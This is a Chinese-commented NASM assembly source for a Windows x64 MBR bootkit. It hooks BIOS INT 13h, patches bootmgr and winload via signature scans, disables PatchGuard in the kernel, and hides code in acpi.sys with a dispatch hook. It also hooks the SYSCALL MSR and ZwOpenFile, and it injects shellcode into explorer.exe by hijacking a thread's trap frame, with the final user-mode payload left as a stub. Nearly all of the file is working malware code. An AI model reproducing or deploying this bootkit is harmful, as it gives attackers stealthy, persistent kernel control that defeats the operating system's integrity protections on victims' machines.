;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 16位 实模式
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
section .realmod
USE16
ORG	0

MBRSIZE	equ 0x200
OFFSET_BACKUP_INT13	equ	0x0C
OFFSET_SECTOR		equ 0x00
BASE_REALMODE		equ 0x7C00
LAST_SECTORS		equ 10
VIR_SECTORS			equ 6

START:
	cli 

    xor bx , bx
    mov ds , bx
    mov ax , [0x413]    ; 0x413记录了bios的内存可用区域
                        ; 由高到底分配
    sub ax , 0x2
    mov [0x413] , ax    ; 更新原值
    shl ax , 0x4        ; 2^4 = 16  ax * 1024 / 16
	            
	mov ax,0x9f00		; 物理地址  es = 0x9f00
	mov es,ax
	mov ds,ax
	xor si,si
;	http://www.oldlinux.org/Linux.old/docs/interrupts/int-html/int-13.htm	
	; si 默认ds
	mov word [si],26
	mov ah,48h
	mov dl,80h		
	int 13h                         ;获取磁盘参数，总扇区数量
	
	mov eax, [si+16]
	sub eax, LAST_SECTORS			; 倒数第10个
	
	mov [cs: 7c00h + BACKUP_SECTORS], eax			; 这里的cs是0，所以需要加绝对地址：)
	mov eax, [si+20]
	mov [cs: 7c00h + BACKUP_SECTORS + 4], eax


	;填写DAP
	mov ax,9e00h					
	mov ds,ax
	mov eax,[es:si+16]
	sub eax,LAST_SECTORS-1		;读取磁盘尾部倒数第9个扇区，是MBR后续的功能代码
	mov ebx,[es:si+20]
	
	mov byte [ds:si],10h  		; 结构体大小，也即版本号
	mov byte [ds:si+1],0		
	
; https://blog.csdn.net/cosmoslife/article/details/9164045
;读入的 buffer 结构，用 c 描述为：
;struct buffer_packet
;{
;    short buffer_packet_size;         /* struct's size（可以为 0x10 或 0x18）*/
;    short sectors;                    /* 读多少个 sectors */
;    char *buffer;                     /* buffer address */
;    long long start_sectors;          /* 从哪个 sector 开始读 */
;    long long *l_buffer;              /* 64 位的 buffer address */
;} buffer;
										
	mov word [ds:si+2], VIR_SECTORS				; 读取扇区数量
	mov dword [ds:si+4],9f000200h		; buff address  9F00:0200h，0200h也即mbr后面的代码
	mov dword [ds:si+8],eax				; 扇区索引
	mov dword [ds:si+12],ebx			; 版本号 0x10，表是16位，该值不用
	mov ah,42h
	mov dl,80h
	int 13h
	
	; 拷贝自己到 0x9F00
	cld 
	xor ax,ax
	mov ds,ax                           ;
	mov si,7c00h
	xor di,di                      ;代码被拷贝到es:di处(分配的保留内存里).注意：拷贝后偏移值改变,计算方法.
	mov cx,MBRSIZE
	rep movsb                      ;拷贝代码到保留内存
	
	push es
	push BootOS
	retf


_int13_hook:
	pushf
	pusha
		cmp ah, 42h
		je	short _int13_hook_work
		cmp ah, 02h
		je	short _int13_hook_work	
	
	popa
	popf
	db  0eah		; JMP FAR ORI_int13
	BACKUP_INT13 dd 0

_int13_hook_work:
	popa
	popf
	
	clc			; 清空标志，不然死循环啊
	push ax

	
	;call dword [cs:BACKUP_INT13]	; 调用原始int13进行读操作
	
	call far [cs:BACKUP_INT13]
	
	;push cs
	;push _mmret			; 返回地址
	
	
	
	;mov ax, [cs:BACKUP_INT13 + 2]
	;push ax
	;mov ax, [cs:BACKUP_INT13]
	;push ax		
	

	;db 0cbh	; 用retf 吧，
	
_mmret:
	nop
	nop
	jc _int13_hook_work_exit						; 失败cf = 1


	cli
	pushfd
	push es
	push ds
	pushad
	
		; https://www.cnblogs.com/0xJDchen/p/9614975.html
		; https://sites.google.com/site/h2obsession/ibm-pc-at/windows/boot-process/phase-5-ntldr-or-bootmgr
		; win7 下 bootmgr 就是 ntldr
		; https://www.3lian.com/edu/2012/10-19/39886.html
		; https://blog.csdn.net/icelord/article/details/1604884
		; https://bbs.pediy.com/thread-54699.htm
		push word 2000h		; ntldr(bootmgr) 基地址
		pop es
		; su.asm 1252 行
		; _TransferToLoader
		
		;seg000:0A77 B9 9A 0A                          mov     cx, 0A9Ah
		;seg000:0A7A 66 03 E9                          add     ebp, ecx
		;seg000:0A7D B9 30 00                          mov     cx, 30h ; '0'
		;seg000:0A80 8E D1                             mov     ss, cx
		;seg000:0A82                                   assume ss:nothing
		;seg000:0A82 8E D9                             mov     ds, cx
		;seg000:0A84                                   assume ds:nothing
		;seg000:0A84 8E C1                             mov     es, cx
		;seg000:0A86                                   assume es:nothing
		;seg000:0A86 66 [BC] FC 1F 06 00                 mov     esp, 61FFCh
		;seg000:0A8C 66 52                             push    edx
		;seg000:0A8E 66 55                             push    ebp
		;seg000:0A90 66 33 ED                          xor     ebp, ebp
		;seg000:0A93 66 6A 20                          push    large 20h ; ' ';
		;seg000:0A96 66 53                             push    eb;x
		;seg000:0A98 66 CB                             retfd
		;seg000:0A98                   sub_A5A         endp
		
		
		cmp byte [es: 0xa87], 0xBC	; [0x20a87]
		jne	_NEQ
		    mov di,0a86h ;目标偏移           
			mov si,512   ;资源偏移    
			mov ax,9f00h ;资源段基址
			mov ds,ax
			mov cx,ProtectCode_PATCH_END - ProtectCode_PATCH_START
			rep movsb
			
			; hook su 完毕，恢复int13
			mov eax, [ds:BACKUP_INT13]
			xor cx,cx
			mov es,cx
			mov dword [es:(13h*4)], eax
		_NEQ:
			
	popad
	pop ds
	pop es
	popfd
	sti
_int13_hook_work_exit:
	retf 2

BootOS:
	mov ax,9e00h
	mov ds,ax
	xor si,si
	mov eax,dword [cs: BACKUP_SECTORS]
	mov ebx,dword [cs: BACKUP_SECTORS+4]
	
	; 读取备份的MBR原始数据到内存
	mov byte [ds:si],10h  
	mov byte [ds:si+1],0			; 恢复 原始 MBR
	mov word [ds:si+2],1
	mov dword [ds:si+4],00007c00h
	mov dword [ds:si+8],eax			; 扇区索引
	mov dword [ds:si+12],ebx
	mov ah,42h
	mov dl,80h
	int 13h
	
	; 还原MBR磁盘内容
	mov ax,0301h;ah=功能号，AL=扇区数
	mov cx,0001h;ch=柱面，cl的扇区
	mov dx,0080h;dh=磁头，dl=驱动器号
	mov bx,7c0h;es:bx 缓冲区地址
	mov es,bx
	mov bx,0
	int 13h;恢复MBR
	
	
	; hook int 13
	xor ax,ax
	mov ds,ax
	mov ax,9f00h
	mov es,ax
	mov eax,[ds:(13h*4)]             			;安装我们的INT13h代码
	mov [es:BACKUP_INT13],	eax					;保存旧的int13向量值
	mov word [ ds: (13h*4) ],_int13_hook
	mov [ds: (13h*4) + 2 ], es        			;设置我们的INT13h向量
	
	db  0eah
	dd  7c00h                       ; jmp far 0:7c00h ;引导系统

	BACKUP_SECTORS	dq 0			; 备份的原始mbr数据


times 510 - ($-$$) db 0 
db 0x55 , 0xAA

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; 32位 保护模式代码	（bootmgr）
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
section .protmod
USE32
SIZE_PROT_CODE	equ ProtectCode_END - ProtectCode_START

ProtectCode_START:
ProtectCode_PATCH_START:
	db 66h
	pushfd
	db 66h
	pushad
	db 66h
	mov ecx, 0x9f000 + ProtectCode_PATCH_END  ; 计算 winload需执行的代码偏移
	db 66h
	push 20h
	db 66h
	push ecx
	db 66h,0cbh ;retfw hook_ntldr_retf 
ProtectCode_PATCH_END:

;----------------------------------------- osload hook ------------------
	mov edi, 401000h	; 默认基地址
	mov ecx, 52a000h	; 搜索大小
	dec edi
	
_seach_start:
	inc edi
	dec ecx
	jz _not_found
	cmp dword [edi],	0E08e8b48h	; 特征码定位
	jnz _seach_start
_found:		; edi = 0x00450D3B
	;;;;;; bootmgr 
	
	;; 进保护模式 0x0450D23
	; https://bbs.pediy.com/thread-188703.htm
	;.text:00450D23
	;.text:00450D23                         loc_450D23:                             ; CODE XREF: Archx86TransferTo64BitApplicationAsm()+6D↑j
	;.text:00450D23 EA 2A 0D 45 00 10 00                    jmp     far   loc_450E24+6
	;.text:00450D2A                         ; ---------------------------------------------------------------------------
	;.text:00450D2A 2B F6                                   sub     esi, esi
	;.text:00450D2C 2B ED                                   sub     ebp, ebp

	; Archx86TransferTo64BitApplicationAsm	
	;.text:00450D3B                 dec     eax
	;.text:00450D3C                 mov     ecx, _BootApp64Parameters[esi]
	;.text:00450D42                 dec     eax
	;.text:00450D43                 mov     eax, _BootApp64EntryRoutine[esi]
	;.text:00450D49                 dec     eax
	;.text:00450D4A                 call    eax
	;.text:00450D4C                 dec     eax
	;.text:00450D4D                 mov     esp, ebx
	;.text:00450D4F                 sub     eax, eax
	;.text:00450D51                 mov     eax, offset byte_450D5B
	;.text:00450D56                 push    20h
	;.text:00450D58                 push    eax
	;.text:00450D59                 dec     eax
	;.text:00450D5A                 retf	
	
	
	mov esi, 0x9f000 + WINLOAD_PATCH_START 	; hook osload
	mov ecx, SIZE_WINLOAD_PATCH
	rep movsb
	
	; 还原su代码
	mov edi,20a86h
	call @@@9
@@@9:pop esi
	add esi,1+@@@7-$
	mov ecx,@@@8-@@@7
	rep movsb
@@@14:
	popad
	popfd
	;hook完osload，执行su原来进入osload代码
@@@7:
	mov     esp, 061FFCh
	push    edx
	push    ebp
	xor ebp,ebp
	push 20h
	push ebx
	db 0cbh 
@@@8:
_not_found:
ProtectCode_END:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 64位 汇编	（Winload）
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
section .osload
USE64
;;;; PATCH CODE

SIZE_WINLOAD_PATCH equ WINLOAD_PATCH_END - WINLOAD_PATCH_START

WINLOAD_PATCH_START:
	mov rbx, 0x09f000 + osload_code_retf 
	jmp rbx
WINLOAD_PATCH_END:

;------------------------------ Winload START ------------------

osload_code_retf:
;	0000000000467AA0
	;text:0000000000067AA0                      OslArchTransferToKernel proc near       ; CODE XREF: OslpMain+8EC↑p
	;.text:0000000000067AA0                                                              ; DATA XREF: .pdata:00000000000B6BC4↓o
	;.text:0000000000067AA0 48 33 F6                             xor     rsi, rsi
	;.text:0000000000067AA3 4C 8B E1                             mov     r12, rcx
	;.text:0000000000067AA6 4C 8B EA                             mov     r13, rdx
	;.text:0000000000067AA9 48 2B C0                             sub     rax, rax
	;.text:0000000000067AAC 66 8E D0                             mov     ss, ax
	;.text:0000000000067AAF 48 8B 25 5A AF 04 00                 mov     rsp, cs:OslArchKernelStack
	;.text:0000000000067AB6 48 8D 05 73 AF 04 00                 lea     rax, OslArchKernelGdt
	;.text:0000000000067ABD 48 8D 0D 5C AF 04 00                 lea     rcx, OslArchKernelIdt
	;.text:0000000000067AC4 0F 01 10                             lgdt    fword   [rax]
	;.text:0000000000067AC7 0F 01 19                             lidt    fword   [rcx]
	;.text:0000000000067ACA 0F 20 E0                             mov     rax, cr4
	;.text:0000000000067ACD 48 0D 80 06 00 00                    or      rax, 680h
	;.text:0000000000067AD3 0F 22 E0                             mov     cr4, rax
	;.text:0000000000067AD6 0F 20 C0                             mov     rax, cr0
	;.text:0000000000067AD9 48 0D 20 00 05 00                    or      rax, 50020h
	;.text:0000000000067ADF 0F 22 C0                             mov     cr0, rax
	;.text:0000000000067AE2 48 B9 80 00 00 C0 00+                mov     rcx, 0C0000080h
	;.text:0000000000067AEC 0F 32                                rdmsr
	;.text:0000000000067AEE 48 0B 05 4B AF 04 00                 or      rax, cs:OslArchEferFlags
	;.text:0000000000067AF5 0F 30                                wrmsr
	;.text:0000000000067AF7 48 C7 C0 40 00 00 00                 mov     rax, 40h
	;.text:0000000000067AFE 0F 00 D8                             ltr     ax
	;.text:0000000000067B01 B9 2B 00 00 00                       mov     ecx, 2Bh
	;.text:0000000000067B06 8E E9                                mov     gs, ecx
	;.text:0000000000067B08                                      assume gs:nothing
	; hook 点
	;.text:0000000000067B08 49 8B CC                             mov     rcx, r12
	;.text:0000000000067B0B 56                                   push    rsi
	;.text:0000000000067B0C 6A 10                                push    10h
	;.text:0000000000067B0E 41 55                                push    r13
	;.text:0000000000067B10 48 CB                                retfq
	;.text:0000000000067B10                      OslArchTransferToKernel endp
	
	push rsi
	push rdi
	mov  rdi, [rsi+491BD0h]
	mov rcx,00069000h;winload.exe .code段大小，防止winload升级，导致winload特征码变化，而异常。
	
	dec rdi
_seach_start_309:
		inc rdi
        dec rcx
        jz @@@11
        CMP DWORD  [rdi],56cc8b49H ;特征码定位 OslArchTransferToKernel+68H，汇编代码为mov rcx, r12   push rsi
        jnz _seach_start_309
        

	; 进保护模式大跳转 0x0450D23，但这里貌似没有开分页，只是扩大了内存寻址范围
	;MEMORY:0000000000594B28 ; ---------------------------------------------------------------------------
	;MEMORY:0000000000594B28 mov     rcx, r12
	;MEMORY:0000000000594B2B push    rsi
	;MEMORY:0000000000594B2C push    10h
	;MEMORY:0000000000594B2E push    r13
	;MEMORY:0000000000594B30 retfq

        call @@@3
@@@3:
		pop rcx
        add rcx,1+pWinloadBack-$
        mov dword  [rcx],edi;备份winload尾部代码指针。
        

        mov esi, 0x09f000 + NT_PATCH_START
        mov ecx, NT_PATCH_SIZE
        rep movsb		;hook winload.exe 尾部代码
        
        ;还原osload尾部代码
        mov edi,450d3bh                            ;osload进入winload代码的偏移。
        call @@@6
@@@6:
		pop rsi
        add esi,1+@@@4-$
        mov ecx, @@@5-@@@4
        rep movsb
        
@@@11:
        pop rdi
        pop rsi
@@@4:
        mov rcx, [rsi+491BE0h]	;原来跳到osload的代码
        mov rax, [rsi+491BD0h]	;原来跳到osload的代码
        call rax               	;原来跳到osload的代码
@@@5:

      pWinloadBack   dd 0
	

NT_PATCH_SIZE	equ NT_PATCH_END - NT_PATCH_START
;; hook 点 0x000000000467B08
NT_PATCH_START:
	mov rdx,009f000h + winload_code_retf
	jmp rdx
NT_PATCH_END:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; hook ntoskrnl
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

winload_code_retf:

		push rsi
		push rdi

        ;hook ntos
        mov r8,r13;r13=nt OEP
		shr r8, 0x0C
		shl r8, 0x0C
		
find_nt_x64:
		sub r8,1000H
        cmp word [r8], 0x5a4d
        jne find_nt_x64
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
_NOP_PG:
	
; nop掉 PatchGuard
        mov r9,r8
        add r9w,1f0h
        mov edx,dword  [r9+21*40+8+4];INIT.VOffset
        mov ecx,dword  [r9+21*40+8];INIT.Rsize
        add rdx,r8		;内核.INIT 段尾部0区地址
        dec rdx
     _SEARCH_380:
		inc rdx
        test ecx,ecx
        jz _END_471
        cmp dword  [rdx],058EC8148H
        JNZ _SEARCH_380				;特征码定位 KiInitializePatchGuar+19h  汇编代码为sub rsp,0f58h
        mov word  [rdx+15],9090h	;阻止检测是否为安全模式，直接进入安全模式。

_NOP_PG_END:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
_SEARCH_ACPI:

		xor rax, rax
        mov rdx,r12			;	LOADER_METER_BLOCK
        add rdx,10h			;   LOADER_METER_BLOCK.MemoryDetorListHead
        mov rdx,[rdx]		;	_LDR_MODULE
		
	_LOOP_393:
			test rdx, rdx
			jz 	_END_LOOP
			
			mov r8,[rdx+8*12]
			cmp dword [r8], 00430041h				
			jnz _NEXT
			cmp dword [r8 + 4], 00490050h
			jnz _NEXT
			
			; found
			mov rax, [rdx + 6*8]	; BassAddress
			jmp _END_LOOP
		_NEXT:
			mov rdx,[rdx]		; 迭代
			JMP  _LOOP_393		; 继续循环。。
	_END_LOOP:				; 结束

_SEARCH_ACPI_END:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_STORE_CODE_IN_ACPI:
	test rax, rax				;
	jz _RESTORE_WINLOAD_HOOK	; 失败直接恢复代码吧，哎

	;hook acpi
	mov r8,rax					; rax = BASEADDR
	mov r9d,dword   [r8+03ch]
	add r9,r8        
							;	hook acpi.sys 建议使用 r8 r9 rcx rdx 寄存器
	movzx edx,word   [r9+14h]	;	SizeOfOptionHeader
	lea r9,[r9+rdx+18h]
	mov ecx,dword  [r9+8]
	mov edx,dword  [r9+8+4]
	lea rcx,[rcx+rdx];	ACPI.SYS.text 段尾部0区地址
	add rcx,r8        

  ;拷贝内核代码到 acpi.text 段尾部0区地址
	;push rsi
	;push rdi
	;push rcx
	mov rax, rcx
	mov rdi, rcx
	mov rsi, 009f000h + ACPIDispatchIrp		; ----->nt_code
	mov rcx,	NT_CODE_END - NT_CODE_START
	rep movsb
_STORE_CODE_IN_ACPI_END:
	



;.text:000000000001B9D7 41 8A 54 24 01                          mov     dl, [r12+1]     ; 控制码
;.text:000000000001B9DC 3C 16                                   cmp     al, 16h
;.text:000000000001B9DE 0F 84 A5 01 00 00                       jz      loc_1BB89
	
	;; rax = 存储区地址
	mov rcx,	020000h			;	acpi.sys .code段大小，防止acpi升级，特征码变化，导致异常
	add r8,		1000h
_SEARCH_440:
	dec rcx
	jz  _RESTORE_WINLOAD_HOOK
	inc r8 
	cmp dword [r8],		24548a41H	; ACPIDispatchIrp+c3特征码搜索 41 8A 54 24 01   mov     dl, [r12+1]   3C 16      cmp     al, 16h
	JNZ _SEARCH_440
	cmp dword [r8+4],	0f163c01H
	jnz _SEARCH_440
	
	; JMP _RESTORE_WINLOAD_HOOK
	mov rcx, rax
	sub rcx, r8
	sub rcx, 5
	
	; 关闭写保护
	mov rax, cr0
	btc rax, 16
	mov cr0, rax
	
	mov byte   [r8],	0E8H		; 构造近 call xxxxxxxx = 目标地址-源地址-5
	MOV DWORD  [r8+1],	ecx

	; 开启写保护
	mov rax, cr0
	btc rax, 16
	mov cr0, rax
	
;还原winload尾部代码
_RESTORE_WINLOAD_HOOK:
        call _458
     _458:
		pop rdx
        sub rdx,$-pWinloadBack-1
        mov edi,dword   [rdx]
        call _461
     _461:
		pop rsi
        add rsi,1+ _END_474 -$
        mov ecx,_END_480 -_END_474
        rep movsb
        
; @@@12
_END_471:
	pop rdi
	pop rsi     
   ;恢复现场，进入nt
   
; @@@1
_END_474:	; winload 0x0000000000594B28
         mov     rcx, r12
         push    rsi
         push    10h
         push    r13
         dw 0cb48h ; retfq
; @@@2
_END_480: 

NT_CODE_START:

; 上Windbg调试方法
; ACPI+0xb9d7 CALL 到这里
;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; acpi IRPDispatch hook
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ACPIDispatchIrp:
	push rcx 
	lea rcx, [rel _KSHELLCODE]
	call _KSHELLCODE_WRAP
	pop rcx
	; 原始代码
	mov   dl, [r12+1]
	ret
ACPIDispatchIrp_END:

; RCX = SHELLCODE START
_KSHELLCODE_WRAP:
	pushfq
	push    rax
	push    rcx
	push    rdx
	push    rbx
	push    rbp
	push    rsi
	push    rdi
	push    r8
	push    r9
	push    r10
	push    r11
	push    r12
	push    r13
	push    r14
	push    r15
	sub     rsp, 28h
	mov		rdx,  rcx
	mov     rcx, [rsp+0A8h]
	call	rdx
	add     rsp, 28h
	pop     r15
	pop     r14
	pop     r13
	pop     r12
	pop     r11
	pop     r10
	pop     r9
	pop     r8
	pop     rdi
	pop     rsi
	pop     rbp
	pop     rbx
	pop     rdx
	pop     rcx
	pop     rax
	popfq
	ret


_KSHELLCODE:
	DATA_ORIGIN_SYSCALL_OFFSET EQU 0x00
	DATA_NTBASE_OFFSET  EQU 0x08
	DATA_ZWOPENFILE_HOOKRET_OFFSET	EQU 0x10
	DATA_KAPC_OFFSET	EQU 0x18
	HASH_ZWOPENFILE	EQU 0xa5c4414e
	
	
	
	call get_data_rbp
	
	mov ecx, 0xC0000082	; MSR寄存器拿到 SYSCALL 原始地址
	rdmsr
	
	; 如果已经 hook 了，则不再 hook
	; 避免未知错误
	mov ecx, [rbp + DATA_ORIGIN_SYSCALL_OFFSET]
	cmp ecx, eax
	je _Exit_760
	
	call _SWR
	
	; 结果保存在 edx:eax
	mov [rbp + DATA_ORIGIN_SYSCALL_OFFSET + 4], edx			; 保存结果
	mov [rbp + DATA_ORIGIN_SYSCALL_OFFSET]	  , eax
	call _SWR

	; 查找 NT 执行体
	mov r15, qword [rbp + DATA_ORIGIN_SYSCALL_OFFSET]
	shr r15, 0x0C
	shl r15, 0x0C 
	
_x64_find_nt_walk_page:
	sub r15, 0x1000
	cmp word [r15], 0x5a4d
	jne _x64_find_nt_walk_page
	
	; r15 = NT BASEADDR

	mov r12,r15
	mov r8,r12
	mov r13d,dword   [r8+03ch]
	add r13,r8        
	; hook Nt 建议使用 r8 r9 rcx rdx 寄存器
	movzx edx,word   [r13+14h];SizeOfOptionHeader
	lea r13,[r13+rdx+18h]
	mov ecx,dword  [r13+8]
	mov edx,dword  [r13+8+4]
	lea rcx,[rcx+rdx];ACPI.SYS.text 段尾部0区地址
	add rcx,r8 
	mov r13,rcx		;nt.text尾部
	call @@_708
@@_708 :pop rcx
	add rcx, _ZwOpenFileHook - $ + 1
	

	;;;;;;;;;;;
	;ret
	;;;;;;;;;;
	
	call _SWR
	mov qword [r13],	rcx	;保存我的ZwOpenFile目标地址
	mov [rbp + DATA_NTBASE_OFFSET], r15	; 保存NT基地址

	call _SWR
	
	mov r12, r13	
	mov edi, HASH_ZWOPENFILE
	call get_proc_addr
		
	; rax = ZwOpenFile
	; hook 点
	; ZwOpenFile+13     50                                      push    rax
	; ZwOpenFile+14     B8 30 00 00 00                          mov     eax, 30h
	
	add rax, 0x13
	sub r12 , rax		; 计算偏移
	sub r12 , 6
	

	call _SWR
	mov byte [rax], 0xFF	
	mov byte [rax + 1],	0x25
	mov [rax + 2], r12d		; JMP QWORD [OFFSET_DWORD]
	lea rax, [rax + 6]		; 计算hook点后的返回地址
	lea rcx, [rel JMP_ZWOPENFILE_RET]	
	mov [rcx], rax			; 存储起来该地址，用来做hook函数的返回
	call _SWR
	
_Exit_760:
	ret


;========================================================================
; Get function address in specific module
; 
; Arguments: r15 = module pointer
;            edi = hash of target function name
; Return: eax = offset
;========================================================================
get_proc_addr:
    ; Save registers
    push rbx
    push rcx
    push rsi                ; for using calc_hash

    ; use rax to find EAT
    mov eax, dword [r15+60]  ; Get PE header e_lfanew
    mov eax, dword [r15+rax+136] ; Get export tables RVA

    add rax, r15
    push rax                 ; save EAT

    mov ecx, dword [rax+24]  ; NumberOfFunctions
    mov ebx, dword [rax+32]  ; FunctionNames
    add rbx, r15

_get_proc_addr_get_next_func:
    ; When we reach the start of the EAT (we search backwards), we hang or crash
    dec ecx                     ; decrement NumberOfFunctions
    mov esi, dword [rbx+rcx*4]  ; Get rva of next module name
    add rsi, r15                ; Add the modules base address

    call calc_hash

    cmp eax, edi                        ; Compare the hashes
    jnz _get_proc_addr_get_next_func    ; try the next function

_get_proc_addr_finish:
    pop rax                     ; restore EAT
    mov ebx, dword [rax+36]
    add rbx, r15                ; ordinate table virtual address
    mov cx, word [rbx+rcx*2]    ; desired functions ordinal
    mov ebx, dword [rax+28]     ; Get the function addresses table rva
    add rbx, r15                ; Add the modules base address
    mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA
    add rax, r15                ; Add the modules base address to get the functions actual VA

    pop rsi
    pop rcx
    pop rbx
    ret

;========================================================================
; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode.
; 
; Argument: rsi = string to hash
; Clobber: rsi
; Return: eax = hash
;========================================================================
calc_hash:
    push rdx
    xor eax, eax
    cdq
_calc_hash_loop:
    lodsb                   ; Read in the next byte of the ASCII string
    ror edx, 13             ; Rotate right our hash value
    add edx, eax            ; Add the next byte of the string
    test eax, eax           ; Stop when found NULL
    jne _calc_hash_loop
    xchg edx, eax
    pop rdx
    ret
	
; 切换读写保护
_SWR:
	push rax
	mov rax,cr0
	btc rax,16
	mov cr0,rax
	pop rax
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;  hook ！！！！！！！！！！！！！！！！
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	; hook ;)
_ZwOpenFileHook:
	; TODO 增加注入操作；）
	pushfq
	push    rax
	push    rcx
	push    rdx
	push    rbx
	push    rbp
	push    rsi
	push    rdi
	push    r8
	push    r9
	push    r10
	push    r11
	push    r12
	push    r13
	push    r14
	push    r15
	call _ZwOpenFileHookReal
	pop     r15
	pop     r14
	pop     r13
	pop     r12
	pop     r11
	pop     r10
	pop     r9
	pop     r8
	pop     rdi
	pop     rsi
	pop     rbp
	pop     rbx
	pop     rdx
	pop     rcx
	pop     rax
	popfq
;;;;;;;;;;;;;;;;;;; 原始代码 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ORI_CODE_START:
	push rax
	mov eax, 30h
ORI_CODE_END:	
	db 0xFF				; JMP QWORD [RIP + 0x6]
	db 0x25
	dd 0x00000000
	JMP_ZWOPENFILE_RET dq 0

_ZwOpenFileHookReal:
	
	HASH_ObOpenObjectByPointer 		EQU 	0x38b2c31b
	HASH_ZwAllocateVirtualMemory 	EQU		0x576e99ea
	HASH_KeStackAttachProcess 		EQU 	0x3df4f002
	
	ObOpenObjectByPointer 		EQU 	0x30
	ZwAllocateVirtualMemory 	EQU		0x08
	KeStackAttachProcess		EQU		0x10
	ProcessHandle				EQU		0x18
	Buff						EQU		0x20
	EPROCESS					EQU		0x28
	Bufflen						EQU		0x38
	KAPC						EQU		0x40
	
	HASH_SPOOLSV             EQU 0x3EE083D8
	HASH_EXPLORER			EQU 0x3eb272e6
	
	
	;  GetCurrentProcessName
	
	mov rax, [gs:0x188]
	mov rbx, [rax + 0x70]
	lea rax, [rbx + 0x2e0]	; processname
	mov rsi, rax
	call calc_hash
	cmp eax, HASH_EXPLORER
	jne _Exit
	
	; ACPI+0x2b387
	call get_data_rbp
	mov r15, [rbp + DATA_NTBASE_OFFSET]
	sub rsp, (8 * 20)
	
	mov edi, HASH_ObOpenObjectByPointer
	call get_proc_addr
	mov [rsp + ObOpenObjectByPointer], rax
	
	mov edi, HASH_ZwAllocateVirtualMemory
	call get_proc_addr
	mov [rsp + ZwAllocateVirtualMemory], rax
	
	mov edi, HASH_KeStackAttachProcess
	call get_proc_addr
	mov [rsp + KeStackAttachProcess], rax

	push rsp
	pop r12


	; rbx = Target EPROCESS
	mov [rsp + EPROCESS], rbx
	
	push r12
	sub rsp, 7 * 8	; 7个参数
	
	mov rcx, rbx
	mov rdx, 200h; kernel handle
	xor r8, r8
	mov r9, 8
	mov qword [rsp + 4 * 8], 0
	mov qword [rsp + 5 * 8], 0
	
	; &Handle
	lea rax, [r12 + ProcessHandle]
	mov qword [rsp + 6 * 8], rax
	call [r12 + ObOpenObjectByPointer]
	
	add rsp, 7 * 8
	pop r12
	
	
	push r12
	sub rsp, 6 * 8	; 6个参数
	mov rcx, [r12 + ProcessHandle]
	lea rdx, [r12 + Buff]
	mov r8, 0
	
	mov qword [r12 +  Bufflen], 0x1000 * 2	; 先申请2个页
	lea r9, [r12 + Bufflen]
	
	mov qword [rsp + 4 * 8], 1000h	; 	MEM_COMMIT
	mov qword [rsp + 5 * 8], 40h	;	PAGE_EXECUTE_READWRITE
	call [r12 + ZwAllocateVirtualMemory]
	add rsp, 6 * 8
	pop r12
	
	push r12
	
	sub rsp, 8 * 2
	mov rcx, [r12 + EPROCESS]	; 获取备份的rbx
	lea rdx, [r12 + KAPC]
	call [r12 + KeStackAttachProcess]
	add rsp, 8 * 2
	
	pop r12
	
	cli
	
	mov rax, [r12 + EPROCESS]	; 获取备份的rbx
	mov rax, [rax + 30h] ; ThreadList

LOOKUP_THREAD:
	mov rax, [rax]
	mov rcx, [rax-2f8h+4ch] ;Alertable : Pos 5, 1 Bit  KTHREAD.Alertable为0的线程才能hook
	and ecx,20h
    jnz LOOKUP_THREAD
	
	mov rax,[rax-2f8h+1d8h];KTHREAD.TrapFrame 
	mov r8,[rax+168h];KTHREAD.TrapFrame.RIP
	
;	保存原始 TrapFrame.Eip
	lea rcx, [rel TRAP_RIP]
	call _SWR
	mov [rcx], r8
	call _SWR
	
	mov rcx, [r12 + Buff]
	mov [rax + 168h], rcx
	
	mov rcx, NT_CODE_END - _R3ShellCode
	lea rsi, [rel _R3ShellCode]
	mov rdi, [r12 + Buff]
	rep movsb
	
	
	;;;;;;;;;;;;;;;;;;;;;;;;
	; 还原hook
	;;;;;;;;;;;;;;;;;;;;;;;;
	lea rsi, [rel ORI_CODE_START]
	lea rdi, [rel JMP_ZWOPENFILE_RET]
	mov rdi, [rdi]	
	mov rcx, ORI_CODE_END - ORI_CODE_START
	sub rdi, rcx		;定位到修改点
	
	call _SWR
	rep movsb
	call _SWR
	
	sti
	; 还原栈
	add rsp, (8 * 20)
_Exit:
	ret
	
get_data_rbp:
	lea rbp, [rel _fake_code_addr + 0x00]
	ret
_fake_code_addr:
_data_store:
	dq 0,0,0,0
	dq 0,0,0,0
	dq 0,0,0,0
	


_R3ShellCode:
	call _R3Main
	db 0xFF				; JMP QWORD [RIP + 0x6]
	db 0x25
	dd 0x00000000
	TRAP_RIP dq 0
	
_R3Main:
	; shellcode 模式
